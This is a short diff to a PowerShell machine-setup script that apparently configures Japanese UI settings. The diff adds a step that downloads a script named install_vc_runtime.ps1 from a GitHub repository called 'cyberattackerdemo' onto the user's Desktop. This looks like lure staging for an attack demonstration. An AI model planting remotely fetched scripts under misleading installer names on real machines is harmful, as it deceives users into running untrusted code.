@@ -109,4 +109,11 @@ Run-Step "Downloading enable_acs.ps1 to Public folder" {
     Invoke-WebRequest -Uri $acsScriptUrl -OutFile $acsScriptPath
 }
 
+Run-Step "Downloading install_vc_runtime.ps1 to Desktop" {
+    $desktopPath = [Environment]::GetFolderPath("Desktop")
+    $downloadUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/install_vc_runtime.ps1"
+    $destinationPath = Join-Path $desktopPath "install_vc_runtime.ps1"
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+}
+
 Write-Log "Setup completed. Please restart the system to apply the Japanese UI and IME settings."
